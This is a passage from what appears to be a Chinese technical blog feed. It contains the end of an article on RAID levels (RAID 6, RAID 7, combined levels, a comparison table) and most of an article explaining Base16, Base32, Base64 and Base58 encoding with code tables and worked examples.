，校验数据可以分别存储在<code>两个</code>不同的<code>校验盘</code>上，或者分散存储在所有成员磁盘中。当两个磁盘同时失效时，即可通过求解两元方程来重建两个磁盘上的数据。</p><ul><li>优点：<ul><li>提供两个磁盘故障的恢复能力；</li><li>具有快速的读取性能、更高的容错能力；</li><li>主要用于对数据安全等级要求非常高的场合；</li></ul></li><li>缺点：<ul><li>写性能也较差；</li><li>由于支持数据的恢复以及校验数据的恢复，因此实现代价很高，控制器的设计也比其他方案更复杂、更昂贵；</li></ul></li></ul><img src="/assets/images/raid-6.png" alt="RAID 6" style="zoom:20%;" /><h3 id="八、RAID-7"><a href="#八、RAID-7" class="headerlink" title="八、RAID 7"></a>八、RAID 7</h3><p><code>RAID 7</code> 的全称是<code>最优化的异步高 I/O 速率和高数据传输率</code>，它与其他 RAID 等级有着明显区别。它不仅仅是一种技术，它还是一个独立存储计算机，自身带的操作系统和管理工具，完全可以独立运行。</p><p><code>RAID 7</code> 的存储计算机操作系统是一套实时事件驱动操作系统，其主要用来进行系统初始化和安排 <code>RAID 7</code> 磁盘阵列的所有数据传输，并把它们转换到相应的物理存储驱动器上。 <code>RAID 7</code> 通过自身系统中的专用控制板来控制读写速度，存储计算机操作系统可使主机 I&#x2F;O 传递性能达到最佳。如果一个磁盘出现故障， RAID7 还能够自动执行恢复操作，并可管理备份磁盘的重建过程。</p><p><code>RAID 7</code> 突破了以往 RAID 标准的技术架构，采用了非同步访问，极大地减轻了数据写瓶颈，提高了 I&#x2F;O 速度。 <code>RAID 7</code> 系统内置实时操作系统还可自动对主机发送过来的读写指令进行优化处理，以智能化方式将可能被读取的数据预先读入快速缓存中，从而大大减少了磁头的转动次数，提高存储系统的 I&#x2F;O 速度。</p><p><code>RAID 7</code> 可帮助用户有效地管理日益庞大的数据存储系统，并使系统的运行效率大大提高，满足不同用户的存储需求。但是， <code>RAID 7</code> 的成本比其他 RAID 等级要高许多。另外， <code>RAID 7</code> 已被某公司注册为商标，目前仅有一家公司提供 <code>RAID 7</code> 的产品，用户没有更多的选择。技术封闭，缺乏主流专业存储厂商的参与和研发严重制约了 RAID7 的发展。</p><ul><li>优点：<ul><li>读&#x2F;写磁盘某一区域的数据时，可以迅速定位；</li><li>采用了非同步访问，极大地减轻了数据写瓶颈，提高了 I&#x2F;O 速度；</li><li>可完全独立于主机运行，不占用主机CPU资源；</li></ul></li><li>缺点：<ul><li>成本比其他 RAID 等级要高许多；</li></ul></li></ul><p><img src="/assets/images/raid-7.png" alt="RAID 7" loading="lazy"></p><h2 id="九、RAID-组合级别"><a href="#九、RAID-组合级别" class="headerlink" title="九、RAID 组合级别"></a>九、RAID 组合级别</h2><h3 id="9-1、RAID-01"><a href="#9-1、RAID-01" class="headerlink" title="9.1、RAID 01"></a>9.1、RAID 01</h3><p><code>RAID 0+1</code>是将<code>RAID 0</code>和<code>RAID 1</code>有效的组合到了一起，先使用<code>RAID 0</code>将磁盘进行条带化，然后使用<code>RAID 1</code>将磁盘镜像化，分为<code>工作盘</code>和<code>镜像盘</code>。<code>RAID 0+1</code>至少需要四块磁盘。</p><ul><li>优点：<ul><li>兼容<code>RAID 0</code>和<code>RAID 1</code>的优点，即具有较好的性能和冗余；</li><li>比<code>RAID 1+0</code>具有更好的容错能力；</li></ul></li><li>缺点：<ul><li>实现比较复杂，成本比较高；</li><li>磁盘的利用率仅为为<code>50%</code>；</li></ul></li></ul><img src="/assets/images/raid-01.png" alt="RAID 01" style="zoom:50%;" /><h3 id="9-2、RAID-10"><a href="#9-2、RAID-10" class="headerlink" title="9.2、RAID 10"></a>9.2、RAID 10</h3><p><code>RAID 1+0</code>是将<code>RAID 1</code>和<code>RAID 0</code>有效的组合到了一起。先使用<code>RAID 1</code>将磁盘镜像化，然后使用<code>RAID 0</code>将镜像化后的磁盘进行条带化。<code>RAID 1+0</code>至少需要<code>四块</code>磁盘。</p><ul><li><p>优点：</p><ul><li>兼容<code>RAID 0</code>和<code>RAID 1</code>的优点，即具有较好的性能和冗余；</li></ul></li><li><p>缺点：</p><ul><li>实现比较复杂，成本比较高；</li><li>磁盘的利用率仅为<code>50%</code>；</li></ul></li></ul><img src="/assets/images/raid-10.png" alt="RAID 10" style="zoom:50%;" /><h3 id="9-3、RAID-30-53"><a href="#9-3、RAID-30-53" class="headerlink" title="9.3、RAID 30&#x2F;53"></a>9.3、RAID 30&#x2F;53</h3><p><code>RAID 30</code>也称为专用奇偶位阵列条带，具有<code>RAID 0</code>和<code>RAID 3</code>的特性，由两组<code>RAID 3</code>的磁盘（每组3个磁盘）组成阵列，使用专用奇偶位，而这两种磁盘再组成一个<code>RAID 0</code>的阵列，实现跨磁盘抽取数据。<code>RAID 30</code>提供容错能力，并支持更大的卷尺寸。像<code>RAID 10</code>一样，<code>RAID 30</code>也提供高可靠性。</p><ul><li>优点：<ul><li>提供组内单个磁盘故障的恢复能力；</li><li>结合 <code>RAID 3</code>和 <code>RAID0</code>，实现数据的高可靠性，用<code>RAID 0</code>的速度加<code>RAID 3</code>的安全；</li></ul></li><li>缺点：<ul><li>数据恢复比较复杂；</li></ul></li></ul><img src="/assets/images/raid-30.png" alt="RAID 30" style="zoom:30%;" /><h3 id="9-4、RAID-50"><a href="#9-4、RAID-50" class="headerlink" title="9.4、RAID 50"></a>9.4、RAID 50</h3><p><code>RAID 50</code> 是<code>RAID 5</code>与<code>RAID 0</code>的结合。它由两组<code>RAID 5</code>磁盘组成，每一组都使用了分布式奇偶位，而两组硬盘再组建成<code>RAID 0</code>，实现跨磁盘抽取数据。每个<code>RAID 5</code>子磁盘组要求至少<code>三块</code>硬盘，最少需要<code>六块</code>磁盘，它最适合需要高可靠性存储、高读取速度、高数据传输性能的应用。这些应用包括事务处理和有许多用户存取小文件的办公应用程序。</p><ul><li><p>优点：</p><ul><li>具备更高的容错能力；</li><li>提供组内单个磁盘故障的恢复能力；</li><li>具备更快数据读取速率的潜力；</li></ul></li><li><p>缺点：</p><ul><li>故障后重建信息的时间比镜像配置情况下要长；</li></ul></li></ul><img src="/assets/images/raid-50.png" alt="RAID 50" style="zoom:30%;" /><h3 id="9-5、RAID-60"><a href="#9-5、RAID-60" class="headerlink" title="9.5、RAID 60"></a>9.5、RAID 60</h3><p><code>RAID 60 </code>是 <code>RAID 6</code>与<code>RAID 0</code>的结合，将<code>RAID 0</code>直接块级条带化与<code>RAID 6</code>的分布式双奇偶校验相结合。每个<code>RAID 6</code>集中的两个磁盘可能会在没有数据丢失的情况下发生故障。此外，在一个<code>RAID 6</code>集中重建单个磁盘时磁盘故障不会导致数据丢失。至少需要八个磁盘才能实现。</p><ul><li><p>优点：</p><ul><li>具备更高的容错能力；</li><li>提供<code>RAID 6</code>组内单个磁盘故障的恢复能力；</li><li>具备更快数据读取速率的潜力；</li></ul></li><li><p>缺点：</p><ul><li>由于奇偶校验计算的额外开销，写入方面略差于<code>RAID 50</code>；</li></ul></li></ul><img src="/assets/images/raid-60.png" alt="RAID 60" style="zoom:50%;" /><h3 id="9-6、RAID-100"><a href="#9-6、RAID-100" class="headerlink" title="9.6、RAID 100"></a>9.6、RAID 100</h3><p><code>RAID 100</code>  也称为 <code>RAID 10+0</code>，是<code>RAID 10</code>与<code>RAID 0</code>的组合，即条带化的 <code>RAID10</code> 。<code>RAID100</code>最顶层的 <code>RAID 0</code> ，即条带化任务，通常由软件层来完成。<code>RAID 100</code> 突破了单个 RAID 控制器对物理磁盘数量的限制，可以获得更高的 I&#x2F;O 负载均衡， I&#x2F;O 压力分散到更多的磁盘上，进一步提高随机读性能，并有效降低热点盘故障风险。因此， <code>RAID 100</code> 通常是大数据库的最佳选择。</p><ul><li><p>优点：</p><ul><li>突破了单个 <code>RAID</code> 控制器对物理磁盘数量的限制，可以获得更高的 I&#x2F;O 负载均衡；</li><li><code> I/O</code> 压力分散到更多的磁盘上，进一步提高随机读性能；</li><li>有效降低热点盘故障风险；</li></ul></li><li><p>缺点：</p><ul><li>实现比较复杂，成本比较高；</li><li>磁盘的利用率仅为<code>50%</code>；</li></ul></li></ul><img src="/assets/images/raid-100.png" alt="RAID 100" style="zoom:40%;" /><h2 id="十、数据表格对比"><a href="#十、数据表格对比" class="headerlink" title="十、数据表格对比"></a>十、数据表格对比</h2><table><thead><tr><th align="center">RAID等级</th><th align="center">别名</th><th align="center">容错性</th><th align="center">冗余类型</th><th align="center">热备份选择</th><th align="center">读性能</th><th align="center">随机写性能</th><th align="center">连续写性能</th><th align="center">磁盘数</th><th align="center">可用容量</th></tr></thead><tbody><tr><td align="center">RAID 0</td><td align="center">条带</td><td align="center">无</td><td align="center">无</td><td align="center">无</td><td align="center">高</td><td align="center">高</td><td align="center">高</td><td align="center">n&gt;&#x3D;1</td><td align="center">100%</td></tr><tr><td align="center">RAID 1</td><td align="center">镜像</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">低</td><td align="center">低</td><td align="center">低</td><td align="center">2n(n&gt;&#x3D;1)</td><td align="center">50%</td></tr><tr><td align="center">RAID 2</td><td align="center">海明码校验条带</td><td align="center">有</td><td align="center"></td><td align="center"></td><td align="center">高</td><td align="center">高</td><td align="center">高</td><td align="center">n&gt;&#x3D;2</td><td align="center"></td></tr><tr><td align="center">RAID 3</td><td align="center">专用奇偶校验条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">低</td><td align="center">低</td><td align="center">n&gt;&#x3D;3</td><td align="center">(n-1)&#x2F;n</td></tr><tr><td align="center">RAID 4</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 5</td><td align="center">分布奇偶校验条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">一般</td><td align="center">低</td><td align="center">n&gt;&#x3D;3</td><td align="center">(n-1)&#x2F;n</td></tr><tr><td align="center">RAID 6</td><td align="center">双重奇偶校验条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">低</td><td align="center">低</td><td align="center">n&gt;&#x3D;4</td><td align="center">(n-2)&#x2F;n</td></tr><tr><td align="center">RAID 7</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 01</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">50%</td></tr><tr><td align="center">RAID 10</td><td align="center">镜像加条带</td><td align="center">有</td><td align="center">有</td><td align="center">有</td><td align="center">高</td><td align="center">一般</td><td align="center">一般</td><td align="center">2n(n&gt;&#x3D;4)</td><td align="center">50%</td></tr><tr><td align="center">RAID 30</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 50</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 60</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">RAID 100</td><td align="center">条带化的 RAID10</td><td align="center"></td><td align="center">有</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">50%</td></tr></tbody></table><p><strong>参考网址：</strong></p><ul><li><a href="https://blog.csdn.net/weixin_42672054/article/details/81206392">https://blog.csdn.net/weixin_42672054/article/details/81206392</a></li><li><a href="http://www.chinastor.com/baike/raid/">http://www.chinastor.com/baike/raid/</a></li><li><a href="http://www.chinastor.com/jishu/raid/12123M292017.html">http://www.chinastor.com/jishu/raid/12123M292017.html</a></li><li><a href="https://www.cnblogs.com/ivictor/p/6099807.html">https://www.cnblogs.com/ivictor/p/6099807.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Raid </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseX编码规则解析</title>
      <link href="/2019/11/18/basex/"/>
      <url>/2019/11/18/basex/</url>
      
        <content type="html"><![CDATA[<p>Base16、Base32、Base64 等其他的 BaseX 编码并不是一种加密方式，它们只是一种编码手段，我们可以借助一些在线的编解码工具还原成明文，因此这类编码方式不适合用于数据加密，但是我们可以使用这种编码很方便的进行数据传输与存储，因此这类编码的使用十分广泛。</p><h2 id="一、Base16"><a href="#一、Base16" class="headerlink" title="一、Base16"></a>一、Base16</h2><h3 id="1-1、编码规则："><a href="#1-1、编码规则：" class="headerlink" title="1.1、编码规则："></a>1.1、编码规则：</h3><p><code>Base16</code>编码使用<code>16</code>个<code>ASCII</code>可打印字符（数字<code>0-9</code>和字母<code>A-F</code>）对任意字节数据进行编码。</p><ul><li><p>获取输入字符串每个字节的二进制值（输入的非ASCII字符，使用UTF-8字符集）；</p></li><li><p>将获得的二进制值串联进来；</p></li><li><p>按照<code>4比特</code>为一组进行切分（<code>8比特</code>数据按照<code>4比特</code>切分刚好是两组，因此<code>Base16</code>无填充符号<code>=</code>）；</p></li><li><p>将每组二进制数分别转换成十进制；</p></li><li><p>按照<code>Base16</code>对应的编码表将对应的编码串接起来就是<code>Base16</code>编码；</p></li></ul><h3 id="1-2、编码特征"><a href="#1-2、编码特征" class="headerlink" title="1.2、编码特征"></a>1.2、编码特征</h3><p>Base16编码后的数据量是原数据的两倍，1000比特数据需要250个字符（即 250*8&#x3D;2000 比特）。换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。</p><p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及<code>Base32</code>和<code>Base64</code>中的<code>=</code>符号。</p><h3 id="1-3、编码表"><a href="#1-3、编码表" class="headerlink" title="1.3、编码表"></a>1.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td align="center">8</td><td align="center">8</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">9</td><td align="center">9</td></tr><tr><td align="center">2</td><td align="center">2</td><td align="center">10</td><td align="center">A</td></tr><tr><td align="center">3</td><td align="center">3</td><td align="center">11</td><td align="center">B</td></tr><tr><td align="center">4</td><td align="center">4</td><td align="center">12</td><td align="center">C</td></tr><tr><td align="center">5</td><td align="center">5</td><td align="center">13</td><td align="center">D</td></tr><tr><td align="center">6</td><td align="center">6</td><td align="center">14</td><td align="center">E</td></tr><tr><td align="center">7</td><td align="center">7</td><td align="center">15</td><td align="center">F</td></tr></tbody></table><h3 id="1-4、编码示例"><a href="#1-4、编码示例" class="headerlink" title="1.4、编码示例"></a>1.4、编码示例</h3><ul><li>待编码字符串：<code>123</code>；</li><li>编码后字符串：<code>313233</code>；</li></ul><table><thead><tr><th align="center">原始字符(ASCII可显示字符)</th><th align="center">对应二进制(对应两个)</th><th align="center">对应编码后字符串</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0011 0001</td><td align="center">31</td></tr><tr><td align="center">2</td><td align="center">0011 0010</td><td align="center">32</td></tr><tr><td align="center">3</td><td align="center">0011 0011</td><td align="center">33</td></tr></tbody></table><h2 id="二、Base32"><a href="#二、Base32" class="headerlink" title="二、Base32"></a>二、Base32</h2><h3 id="2-1、编码规则"><a href="#2-1、编码规则" class="headerlink" title="2.1、编码规则"></a>2.1、编码规则</h3><p><code>Base32</code>编码是使用<code>32</code>个<code>ASCII</code>可打印字符（字母<code>A-Z</code>和数字<code>2-7</code>）对任意字节数据进行编码。</p><ul><li><p>获取输入字符串每个字节的二进制值（输入的非ASCII字符，使用UTF-8字符集）；</p></li><li><p>将获得的二进制值串联进来；</p></li><li><p>按照<code>5比特</code>为一组进行切分；</p></li><li><p>将每组二进制数分别转换成十进制；</p></li><li><p>按照<code>Base32</code>对应的编码表将对应的编码串接起来就是<code>Base32</code>编码；</p></li></ul><h3 id="2-2、编码特征"><a href="#2-2、编码特征" class="headerlink" title="2.2、编码特征"></a>2.2、编码特征</h3><ul><li>数据的二进制传输是按照<code>8比特</code>一组进行（即一个字节）；</li><li><code>Base32</code>按<code>5比特</code>切分的二进制数据必须是<code>40比特的倍数</code>（5和8的最小公倍数），最小为<code>40个比特</code>；</li><li>编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理；</li></ul><p><strong>与Base64相比，Base32具有许多优点：</strong></p><ul><li>适合不区分大小写的文件系统，更利于人类口语交流或记忆；</li><li>结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号；</li><li>排除了视觉上容易混淆的字符，因此可以准确的人工录入（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）；</li><li>排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符；</li></ul><p><strong>与Base16相比，Base32的优势：</strong></p><ul><li>Base32比Base16占用的空间更小（1000比特数据Base32需要200个字符，而Base16则为250个字符）；</li></ul><p><strong>Base32的缺点：</strong></p><ul><li>Base32比Base64多占用大约20％的空间，因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据；</li></ul><h3 id="2-3、编码表"><a href="#2-3、编码表" class="headerlink" title="2.3、编码表"></a>2.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td align="center">8</td><td align="center">I</td><td align="center">16</td><td align="center">Q</td><td align="center">24</td><td align="center">Y</td></tr><tr><td align="center">1</td><td align="center">B</td><td align="center">9</td><td align="center">J</td><td align="center">17</td><td align="center">R</td><td align="center">25</td><td align="center">Z</td></tr><tr><td align="center">2</td><td align="center">C</td><td align="center">10</td><td align="center">K</td><td align="center">18</td><td align="center">S</td><td align="center">26</td><td align="center">2</td></tr><tr><td align="center">3</td><td align="center">D</td><td align="center">11</td><td align="center">L</td><td align="center">19</td><td align="center">T</td><td align="center">27</td><td align="center">3</td></tr><tr><td align="center">4</td><td align="center">E</td><td align="center">12</td><td align="center">M</td><td align="center">20</td><td align="center">U</td><td align="center">28</td><td align="center">4</td></tr><tr><td align="center">5</td><td align="center">F</td><td align="center">13</td><td align="center">N</td><td align="center">21</td><td align="center">V</td><td align="center">29</td><td align="center">5</td></tr><tr><td align="center">6</td><td align="center">G</td><td align="center">14</td><td align="center">O</td><td align="center">22</td><td align="center">W</td><td align="center">30</td><td align="center">6</td></tr><tr><td align="center">7</td><td align="center">H</td><td align="center">15</td><td align="center">P</td><td align="center">23</td><td align="center">X</td><td align="center">31</td><td align="center">7</td></tr><tr><td align="center">填充</td><td align="center">&#x3D;</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="2-4、编码示例"><a href="#2-4、编码示例" class="headerlink" title="2.4、编码示例"></a>2.4、编码示例</h3><ul><li>待编码字符串：<code>123</code>；</li><li>编码后字符串：<code>GEZDG===</code>；</li></ul><table><thead><tr><th align="center">原始字符(ASCII可显示字符)</th><th align="center">对应二进制(对应两个)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0011 0001</td></tr><tr><td align="center">2</td><td align="center">0011 0010</td></tr><tr><td align="center">3</td><td align="center">0011 0011</td></tr></tbody></table><ul><li>拼接后的二进制：<code>00110001 00110010 00110011</code>；</li><li>按照5比特进行拆分：<code>00110 00100 11001 00011 0011</code>；</li><li>最后一组的位数不足5，末位填充0后：<code>00110 00100 11001 00011 00110</code>；</li><li>对应字符串位：<code>GEZDG</code>；</li><li>由于最少为40个比特，计算<code>40/5=8</code>，因此需要补<code>3</code>个<code>=</code>，最终为<code>GEZDG===</code>；</li></ul><h2 id="三、Base64"><a href="#三、Base64" class="headerlink" title="三、Base64"></a>三、Base64</h2><h3 id="3-1、编码规则"><a href="#3-1、编码规则" class="headerlink" title="3.1、编码规则"></a>3.1、编码规则</h3><p><code>Base64</code>编码是使用<code>64</code>个<code>ASCII</code>可打印字符（<code>A-Z</code>、<code>a-z</code>、<code>0-9</code>、<code>+</code>、<code>/</code>）对任意字节数据进行编码。</p><ul><li><p>获取输入字符串每个字节的二进制值（若不足8比特则高位补0）；</p></li><li><p>将获得的二进制值串联进来；</p></li><li><p>按照<code>6特</code>为一组进行切分；</p></li><li><p>将每组二进制数分别转换成十进制；</p></li><li><p>按照<code>Base64</code>对应的编码表将对应的编码串接起来就是<code>Base64</code>编码；</p></li></ul><p>由于二进制数据是按照<code>8比特</code>一组进行传输，因此<code>Base64</code>按照<code>6比特</code>一组切分的二进制数据必须是<code>24比特</code>的倍数（6和8的最小公倍数），<code>24比特</code>就是<code>3个字节</code>，若<code>原字节序列</code>数据长度<code>不是3的倍数</code>时：</p><ul><li><p>原字节序列剩下<code>1个</code>输入数据，则在编码结果后<code>加1个=</code>；</p></li><li><p>原字节序列剩下<code>2个</code>输入数据，则在编码结果后<code>加2个=</code>；</p></li></ul><h3 id="3-2、编码特征"><a href="#3-2、编码特征" class="headerlink" title="3.2、编码特征"></a>3.2、编码特征</h3><p>完整的<code>Base64</code>定义可见<code>RFC1421</code>和<code>RFC2045</code>。因为<code>Base64</code>算法是将<code>3个字节原数据</code>编码为<code>4个字节新数据</code>，所以<code>Base64</code>编码后的数据比原始数据略长，为原来的<code>4/3</code>。在电子邮件中，根据<code>RFC822</code>规定，每<code>76</code>个字符，还需要加上<code>一个回车换行</code>。可以估算编码后数据长度大约为原长的<code>135.1%</code>。</p><p><code>Base64</code>可用于任意数据的底层二进制数据编码，以应用于只能传输<code>ASCII</code>字符的场合。不过最常用于文本数据的处理传输，例如在<code>MIME</code>格式的电子邮件中，<code>Base64</code>可以用来编码邮件内容，方便在不同语言计算机间传输而不乱码，注意是传输而不是显示，例如在西欧地区计算机上使用<code>UTF-8</code>编码即可正常显示中文（安装有对应字库），但是它未必能正常传输中文，这时转换为<code>Base64</code>便无此顾虑。</p><p><code>Base64</code>编码若无特别说明，通常约定<code>非ASCII字符</code>按照<code>UTF-8字符集</code>进行编码处理。</p><h3 id="3-3、编码表"><a href="#3-3、编码表" class="headerlink" title="3.3、编码表"></a>3.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">A</td><td align="center">16</td><td align="center">Q</td><td align="center">32</td><td align="center">g</td><td align="center">48</td><td align="center">w</td></tr><tr><td align="center">1</td><td align="center">B</td><td align="center">17</td><td align="center">R</td><td align="center">33</td><td align="center">h</td><td align="center">49</td><td align="center">x</td></tr><tr><td align="center">2</td><td align="center">C</td><td align="center">18</td><td align="center">S</td><td align="center">34</td><td align="center">i</td><td align="center">50</td><td align="center">y</td></tr><tr><td align="center">3</td><td align="center">D</td><td align="center">19</td><td align="center">T</td><td align="center">35</td><td align="center">j</td><td align="center">51</td><td align="center">z</td></tr><tr><td align="center">4</td><td align="center">E</td><td align="center">20</td><td align="center">U</td><td align="center">36</td><td align="center">k</td><td align="center">52</td><td align="center">0</td></tr><tr><td align="center">5</td><td align="center">F</td><td align="center">21</td><td align="center">V</td><td align="center">37</td><td align="center">l</td><td align="center">53</td><td align="center">1</td></tr><tr><td align="center">6</td><td align="center">G</td><td align="center">22</td><td align="center">W</td><td align="center">38</td><td align="center">m</td><td align="center">54</td><td align="center">2</td></tr><tr><td align="center">7</td><td align="center">H</td><td align="center">23</td><td align="center">X</td><td align="center">39</td><td align="center">n</td><td align="center">55</td><td align="center">3</td></tr><tr><td align="center">8</td><td align="center">I</td><td align="center">24</td><td align="center">Y</td><td align="center">40</td><td align="center">o</td><td align="center">56</td><td align="center">4</td></tr><tr><td align="center">9</td><td align="center">J</td><td align="center">25</td><td align="center">Z</td><td align="center">41</td><td align="center">p</td><td align="center">57</td><td align="center">5</td></tr><tr><td align="center">10</td><td align="center">K</td><td align="center">26</td><td align="center">a</td><td align="center">42</td><td align="center">q</td><td align="center">58</td><td align="center">6</td></tr><tr><td align="center">11</td><td align="center">L</td><td align="center">27</td><td align="center">b</td><td align="center">43</td><td align="center">r</td><td align="center">59</td><td align="center">7</td></tr><tr><td align="center">12</td><td align="center">M</td><td align="center">28</td><td align="center">c</td><td align="center">44</td><td align="center">s</td><td align="center">60</td><td align="center">8</td></tr><tr><td align="center">13</td><td align="center">N</td><td align="center">29</td><td align="center">d</td><td align="center">45</td><td align="center">t</td><td align="center">61</td><td align="center">9</td></tr><tr><td align="center">14</td><td align="center">O</td><td align="center">30</td><td align="center">e</td><td align="center">46</td><td align="center">u</td><td align="center">62</td><td align="center">+</td></tr><tr><td align="center">15</td><td align="center">P</td><td align="center">31</td><td align="center">f</td><td align="center">47</td><td align="center">v</td><td align="center">63</td><td align="center">&#x2F;</td></tr></tbody></table><h3 id="3-4、编码示例"><a href="#3-4、编码示例" class="headerlink" title="3.4、编码示例"></a>3.4、编码示例</h3><ul><li>待编码字符串：<code>1234</code>；</li><li>编码后字符串：<code>MTIzNA==</code>；</li></ul><table><thead><tr><th align="center">原始字符(ASCII可显示字符)</th><th align="center">对应二进制(对应两个)</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">00110001</td></tr><tr><td align="center">2</td><td align="center">00110010</td></tr><tr><td align="center">3</td><td align="center">00110011</td></tr><tr><td align="center">4</td><td align="center">00110100</td></tr></tbody></table><ul><li>拼接后的二进制：<code>00110001 00110010 00110011 00110100</code>；</li><li>按照<code>6比特</code>进行拆分：<code>001100 010011 001000 110011 001101 00</code>；</li><li>最后一组的位数<code>不足5</code>，末位填充0后：<code>001100 010011 001000 110011 001101 000000</code>；</li><li>对应编码表的字符串：<code>MTIzNA</code>；</li><li>原字节序列的长度为<code>4</code>，不为<code>3</code>的倍数，还差<code>2个</code>输入数据，所以需要补上<code>2个=</code>，最终为：<code>MTIzNA==</code>；</li></ul><h2 id="四、Base58"><a href="#四、Base58" class="headerlink" title="四、Base58"></a>四、Base58</h2><h3 id="4-1、编码规则"><a href="#4-1、编码规则" class="headerlink" title="4.1、编码规则"></a>4.1、编码规则</h3><p><code>Base58</code>编码使用<code>58</code>个<code>ASCII</code>可打印字符（不使用数字<code>0</code>，大写字母<code>O</code>、大写字母<code>I</code>、小写字母<code>l</code>，以及<code>+</code>和<code>/</code>）对 <strong>数字</strong> 进行编码。</p><ul><li>通过对数字不断<code>取余58</code>，依据获取的余数对照编码表得到对应的编码值；</li><li>通过不断的对数字进行<code>取整</code>操作，得到新的数字进入下一个循环；</li><li>当新的数字为<code>0</code>时，结束编码；</li><li>通过对循环中每次得到的编码按照得到的先后顺序逆序排序（即第一次得到的编码在最终编码值的末尾），得到最终的编码值；</li></ul><h3 id="4-2、编码特征"><a href="#4-2、编码特征" class="headerlink" title="4.2、编码特征"></a>4.2、编码特征</h3><ul><li>在某些字体下，<code>数字0</code>和<code>字母大写O</code>，以及<code>字母大写I</code>和<code>字母小写l</code>会非常相似，为避免混淆，不使用这些字符；</li><li>不使用<code>+</code>和<code>/</code>的原因是非字母或数字的字符串作为帐号较难被接受；</li><li>没有标点符号，通常不会被从中间分行；</li><li>大部分的软件支持双击选择整个字符串；</li><li>编码后的数据为原始的数据长度的<code>1.37倍</code>，稍稍多于Base64的1.33倍；</li><li>用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址；</li></ul><h3 id="4-3、编码表"><a href="#4-3、编码表" class="headerlink" title="4.3、编码表"></a>4.3、编码表</h3><table><thead><tr><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th><th align="center">值</th><th align="center">编码</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">15</td><td align="center">G</td><td align="center">30</td><td align="center">X</td><td align="center">45</td><td align="center">n</td></tr><tr><td align="center">1</td><td align="center">2</td><td align="center">16</td><td align="center">H</td><td align="center">31</td><td align="center">Y</td><td align="center">46</td><td align="center">o</td></tr><tr><td align="center">2</td><td align="center">3</td><td align="center">17</td><td align="center">J</td><td align="center">32</td><td align="center">Z</td><td align="center">47</td><td align="center">p</td></tr><tr><td align="center">3</td><td align="center">4</td><td align="center">18</td><td align="center">K</td><td align="center">33</td><td align="center">a</td><td align="center">48</td><td align="center">q</td></tr><tr><td align="center">4</td><td align="center">5</td><td align="center">19</td><td align="center">L</td><td align="center">34</td><td align="center">b</td><td align="center">49</td><td align="center">r</td></tr><tr><td align="center">5</td><td align="center">6</td><td align="center">20</td><td align="center">M</td><td align="center">35</td><td align="center">c</td><td align="center">50</td><td align="center">s</td></tr><tr><td align="center">6</td><td align="center">7</td><td align="center">21</td><td align="center">N</td><td align="center">36</td><td align="center">d</td><td align="center">51</td><td align="center">t</td></tr><tr><td align="center">7</td><td align="center">8</td><td align="center">22</td><td align="center">P</td><td align="center">37</td><td align="center">e</td><td align="center">52</td><td align="center">u</td></tr><tr><td align="center">8</td><td align="center">9</td><td align="center">23</td><td align="center">Q</td><td align="center">38</td><td align="center">f</td><td align="center">53</td><td align="center">v</td></tr><tr><td align="center">9</td><td align="center">A</td><td align="center">24</td><td align="center">R</td><td align="center">39</td><td align="center">g</td><td align="center">54</td><td align="center">w</td></tr><tr><td align="center">10</td><td align="center">B</td><td align="center">25</td><td align="center">S</td><td align="center">40</td><td align="center">h</td><td align="center">55</td><td 